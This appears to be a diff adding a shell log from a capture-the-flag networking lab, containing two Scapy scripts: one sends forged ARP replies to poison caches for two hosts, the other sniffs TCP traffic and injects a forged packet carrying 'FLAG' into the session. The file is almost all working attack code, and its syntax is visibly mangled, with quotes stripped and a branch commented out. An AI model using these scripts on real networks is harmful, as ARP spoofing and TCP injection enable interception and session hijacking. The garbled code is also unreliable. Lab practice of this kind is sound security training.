@@ -1,0 +1,66 @@
+cat mitm.py 
+from scapy.all import *
+
+
+my=get_if_hwaddr(eth0)
+
+p=(Ether(src=my,dst=ff:ff:ff:ff:ff:ff) / ARP(op=is-at,psrc=10.0.0.4,hwsrc=my))
+sendp(p,eth0)
+p2=(Ether(src=my,dst=ff:ff:ff:ff:ff:ff) / ARP(op=is-at,psrc=10.0.0.3,hwsrc=my))
+sendp(p2,eth0)
+hacker@intercepting-communication~level14:~$ cat f5.py 
+
+from scapy.all import *
+
+# Define a callback function to handle intercepted packets
+def packet_callback(packet):
+    my_ip = get_if_hwaddr(eth0)
+
+    if packet.src == my_ip:
+        return
+
+    global first_packet_received
+    if packet.haslayer(TCP):
+        print(Packet Summary:)
+        print(packet.summary())
+
+        if packet.haslayer(Raw):
+            print(Raw Payload:)
+            print(packet[Raw].load)
+
+            # Check if the first packet conditions are met
+            if COMMANDS: in packet[Raw].load.decode():
+                print(First condition is met)
+                #first_packet_received = True
+
+            # Check if the second packet conditions are met
+#            elif first_packet_received and COMMANDS: not in packet[Raw].load.decode():
+                print(Second condition is met)
+                hex_dump = e66915df0bbe2a768dbdfb3c0800450000394f6f40003f06d8490a0000040a000003c4127a698ac415b57ee22782801801f67c7800000101080a07b5b04e2ff3df574543484f0a
+
+# Convert the hex dump to bytes
+                packet_bytes = bytes.fromhex(hex_dump)
+
+# Parse the packet
+                new_packet = Ether(packet_bytes)
+               # Craft a new packet with the same attributes but different payload
+                new_seq = packet[TCP].ack  # Incrementing sequence number by the length of the payload
+                new_ack = packet[TCP].seq + len(packet[Raw])  # Acknowledgment number should be the next expected sequence number
+                
+                new_packet = Ether(src=packet.dst, dst=packet.src) /
+                IP(src=packet[IP].dst, dst=packet[IP].src) /
+                TCP(sport=packet[TCP].dport, dport=packet[TCP].sport,
+                                 seq=new_seq, ack=new_ack, flags=PA) /FLAGn  # Adjusted payload to FLAGn
+                new_packet[IP].chksum = None  # Setting to None triggers automatic recalculation
+                new_packet[TCP].chksum = None
+                print(bytes(new_packet))
+                # Send the new packet
+                sendp(new_packet, iface=eth0)
+
+                # Reset the flag
+                #first_packet_received = False
+
+
+# Start sniffing packets on eth0
+#first_packet_received = False
+sniff(iface=eth0, prn=packet_callback, filter=tcp)
